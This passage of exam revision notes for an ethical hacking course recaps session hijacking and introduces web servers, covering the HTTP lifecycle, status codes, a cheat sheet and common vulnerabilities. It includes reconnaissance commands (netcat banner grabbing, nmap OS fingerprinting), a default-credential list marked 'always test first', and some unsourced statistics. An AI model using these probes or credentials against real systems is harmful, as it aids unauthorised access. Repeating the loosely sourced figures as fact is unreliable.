> - **Do not confuse** "session hijacking" with "session fixation" in your answer — they are related but distinct concepts.
> - For **part (a)**, students often write only the *general* TCP handshake and forget to mention **Morris's specific 1985 attack** and the **RFC 6528 mitigation**. Both are mandatory for full marks.
> - For **part (b)**, mentioning only "weak passwords" is insufficient — you must list **at least three distinct IoT-specific vulnerabilities** and **one real-world example** (Mirai is the standard expected answer).

---

### Topic Recap & Important Things to Remember (Rapid Revision Checklist)

> [!IMPORTANT]
> **Last-Minute Revision — 60-Second Summary**
>
> - **Definition:** Stealing or predicting a valid session token to impersonate the user.
> - **Two Axes:** Network-level (TCP) vs. Application-level (HTTP cookies). Active vs. Passive.
> - **6-Phase Kill Chain:** Recon → Theft → Injection → Server Trust → Action → Cover-up.
> - **Theft Vectors:** Sniffing, XSS, malware, session fixation, physical access.
> - **Morris Attack (1985):** Predicted TCP ISNs to inject forged packets.
> - **Modern Fix:** RFC 6528 strong ISN generator using SHA-1 + per-boot secret.
> - **Cookie Hardening:** HttpOnly + Secure + SameSite=Strict + 128-bit entropy + short expiry.
> - **SID Binding:** Regenerate on login; bind to User-Agent and IP.
> - **IoT Risk:** Default creds, no TLS, no patching, Mirai botnet precedent.
> - **Tools:** Ettercap, Hunt, T-Sight, Wireshark, Burp Suite, BetterCAP, Hamster & Ferret.
> - **Best Defense:** HTTPS everywhere, strong tokens, regenerate on auth, monitor anomalies.

> [!NOTE]
> **Final Examiner's Mantra:** *"Always state the attack phase, the layer (L4 or L7), and at least one named countermeasure — KTU answers that hit all three elements consistently score in the 90th percentile."*
<!-- SECTION_5_END -->

topics.title: Web Server
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY
> - **Module:** Module 2
> - **Topic:** Web Server

<!-- SECTION_1_START -->
# 🖥️ MODULE 2 — WEB SERVER: CORE TECHNICAL DEFINITION & INTUITIVE OVERVIEW

## 1.1 Formal Academic Definition (KTU 2024 Syllabus Terminology)

> [!IMPORTANT]
> **Web Server (KTU 2024 Definition):**
> A **Web Server** is a software/hardware system that stores, processes, and delivers web pages, static/dynamic content, and web applications to clients over the **Hypertext Transfer Protocol (HTTP)** or its secure variant **HTTPS**. It accepts incoming requests from web clients (browsers, bots, attackers), maps the **Uniform Resource Locator (URL)** to the corresponding file or script on disk/execution environment, executes server-side logic where required, and returns an **HTTP Response** containing the requested resource, status codes, and metadata.

From an **Ethical Hacking** perspective, the web server is treated as a *high-value attack surface* because it is publicly exposed on **port 80 (HTTP)** and **port 443 (HTTPS)**, making it the most frequently targeted service in real-world penetration tests.

### 1.1.1 Common Web Server Software (Industry-Standard Examples)

| Web Server | Vendor/Origin | Default Port | Market Usage (Approx.) |
|---|---|---|---|
| **Apache HTTPD** | Apache Foundation | 80 / 443 | Widely used, Linux |
| **Nginx** | F5 Networks (orig. Russia) | 80 / 443 | Reverse proxy, high-traffic |
| **Microsoft IIS** | Microsoft | 80 / 443 | Windows Server |
| **LiteSpeed** | LiteSpeed Tech | 80 / 443 | Performance-optimized |
| **Tomcat** | Apache Foundation | 8080 | Java JSP/Servlets |

---

## 1.2 Intuitive Analogy (Plain English)

> [!NOTE]
> **Restaurant Analogy:**
> Think of a web server as a **restaurant waiter** in a busy hotel.
> - The **customer (browser)** sits at a table and tells the waiter what they want (HTTP Request: `GET /index.html`).
> - The **waiter (web server)** takes the order to the **kitchen (backend / database / file system)**.
> - The kitchen prepares the dish (renders HTML, runs PHP, queries SQL).
> - The waiter brings the dish back to the customer (HTTP Response: status code 200 + content).
> - If the dish is unavailable, the waiter politely says "404 Not Found" (Error code).
> - If the kitchen is overloaded, the waiter says "503 Service Unavailable" (server-side failure).
>
> An **ethical hacker** acts like a *mystery shopper* — testing whether the waiter leaks kitchen secrets, accepts fake orders, or gets fooled by a forged customer ID.

---

## 1.3 Why Web Servers Are Critical in Ethical Hacking

> [!IMPORTANT]
> **Key Metrics (Industry Standard):**
> - **OWASP Top 10 (2021)** — 8 out of 10 vulnerabilities involve web-facing assets served via a web server.
> - Average enterprise exposes **300+ web servers** (public + internal).
> - **HTTP** traffic constitutes **>55%** of total internet bandwidth.
> - Default port **80 (HTTP)** and **443 (HTTPS)** are always in the attacker's initial port-scan list.

The web server is **Step 1 of the Cyber Kill Chain** — if compromised, the attacker pivots into the internal network, exfiltrates data, and escalates privileges.

---

## 1.4 Standard Web Server Architecture (Two-Tier Model)

```
┌─────────────────┐         HTTP/HTTPS          ┌────────────────────┐
│  Web Client     │  ───────────────────────►   │  Web Server        │
│  (Browser/Bot)  │  ◄───────────────────────   │  (Apache/Nginx)    │
└─────────────────┘    Response + Status Code   └────────┬───────────┘
                                                        │
                                          Server-Side Script
                                                        │
                                              ┌─────────▼─────────┐
                                              │  Backend          │
                                              │  (DB / API / FS)  │
                                              └───────────────────┘
```

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 🔍 DEEP THEORETICAL ANALYSIS & KTU HIGH-YIELD FORMULA SHEET

## 2.1 Working of a Web Server — Step-by-Step Logical Breakdown

> [!NOTE]
> A web server operates in a strict request-response lifecycle. Ethical hackers must understand each stage to identify where attacks can be injected.

1. **Client Initiates Connection (TCP Handshake)**
   - Browser opens a **TCP 3-way handshake** (`SYN → SYN-ACK → ACK`) on **port 80** (HTTP) or **port 443** (HTTPS).
   - For HTTPS, an additional **TLS handshake** negotiates encryption keys.

2. **Request Line is Sent**
   - The client sends an HTTP request line:
     `GET /index.html HTTP/1.1`
   - Methods include: `GET`, `POST`, `PUT`, `DELETE`, `HEAD`, `OPTIONS`, `PATCH`, `TRACE`.

3. **Headers are Transmitted**
   - `Host:`, `User-Agent:`, `Cookie:`, `Referer:`, `Accept:`, `Authorization:`.
   - These headers are a **major attack surface** (HTTP header injection, cookie theft).

4. **Web Server Parses the Request**
   - The server's **request parser** extracts the **Method + URI + HTTP Version**.
   - **URL normalization** is performed (e.g., decoding `%20`, resolving `..`).

5. **Resource Mapping & Authorization**
   - The server maps the URI to a physical path on disk (e.g., `/var/www/html/index.html`).
   - **Access Control Lists (ACLs)** are evaluated: *is the user authorized?*

6. **Server-Side Script Execution (Dynamic Content)**
   - If the resource is a script (`.php`, `.jsp`, `.asp`), it is forwarded to the **Application Server / CGI / interpreter**.

7. **Response is Constructed**
   - HTTP status code is set (e.g., `200 OK`, `301 Moved`, `403 Forbidden`, `500 Internal Server Error`).
   - Response headers + body are transmitted back.

8. **Connection Handling**
   - `Connection: keep-alive` → reuses the TCP connection.
   - `Connection: close` → terminates the session.

---

## 2.2 The HTTP Status Code Matrix (High-Yield for KTU Exams)

> [!IMPORTANT]
> **Status codes are 3-digit numbers grouped into 5 classes. Memorize the following — it appears in nearly every KTU question paper.**

| Class | Range | Category | Example Codes | Meaning |
|---|---|---|---|---|
| **1xx** | 100–199 | Informational | `100 Continue` | Request received, continue |
| **2xx** | 200–299 | Success | `200 OK`, `201 Created`, `204 No Content` | Request succeeded |
| **3xx** | 300–399 | Redirection | `301 Moved Permanently`, `302 Found`, `304 Not Modified` | Further action needed |
| **4xx** | 400–499 | Client Error | `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `405 Method Not Allowed` | Client-side fault |
| **5xx** | 500–599 | Server Error | `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`, `504 Gateway Timeout` | Server-side fault |

**Ethical Hacking Insight:** A sudden spike in `4xx` codes often indicates **reconnaissance / brute-force probing** by an attacker.

---

## 2.3 KTU High-Yield Formula Sheet & Cheat Sheet

> [!NOTE]
> Use this table as your **last-night revision sheet**. Every row is a potential 3-mark or 14-mark question.

| # | Concept | Definition / Formula / Rule | Security Implication |
|---|---|---|---|
| 1 | Default HTTP Port | **80** | Always scanned first |
| 2 | Default HTTPS Port | **443** | TLS-protected, but still vulnerable |
| 3 | HTTP Methods | `GET, POST, PUT, DELETE, HEAD, OPTIONS, TRACE, PATCH` | Dangerous methods: `PUT, DELETE, TRACE` |
| 4 | TRACE Method | Echoes the request back → enables **XST (Cross-Site Tracing)** | Disable in production |
| 5 | Banner Grabbing | `nc -v target 80` → read server header | Reveals **server version** |
| 6 | OS Fingerprinting | `nmap -O target` → identify OS | Used for exploit selection |
| 7 | HTTP Response Header Leak | `Server: Apache/2.2.15 (CentOS)` | Information disclosure |
| 8 | Default Credentials | admin/admin, root/toor, administrator/password | **Always test first** |
| 9 | Directory Listing | `Options +Indexes` in Apache | Lists all files → info disclosure |
| 10 | File Upload Restriction | Whitelist extensions: `.jpg, .png, .pdf` | Blacklists can be bypassed |
| 11 | Patch Latency Window | Time between CVE disclosure and patch deployment | Exploitable in this window |
| 12 | Connection Limit (DoS) | Nginx default: `worker_connections 1024` | Flood attacks exhaust this |
| 13 | Reverse Proxy Role | Hides backend server IP from public | Mitigates direct attacks |
| 14 | HTTPS Strength | TLS 1.2+ recommended; TLS 1.0/1.1 deprecated | Vulnerable to **POODLE, BEAST** |
| 15 | Virtual Hosting | Single IP, multiple domains via `Host` header | Header manipulation attacks |

---

## 2.4 Common Web Server Vulnerabilities (OWASP-Aligned)

> [!IMPORTANT]
> **Top Web Server Vulnerabilities Tested in KTU Examinations:**

1. **Information Disclosure** — Server banner reveals version (e.g., `Apache/2.2.15`).
2. **Directory Traversal** — Attacker uses `../` to escape webroot and read system files.
3. **Remote Code Execution (RCE)** — Vulnerable CGI scripts, unpatched server binaries.
4. **Denial of Service (DoS / DDoS)** — Exhaust server resources via request flooding.
5. **Buffer Overflow** — Crafted HTTP request overwrites memory.
6. **HTTP Request Smuggling** — Exploits differences in how proxy and server parse `Content-Length` vs. `Transfer-Encoding`.
7. **Cross-Site Tracing (XST)** — Abuses the `TRACE` method to steal cookies.
8. **Session Hijacking** — Weak session ID generation or unencrypted cookie transmission.
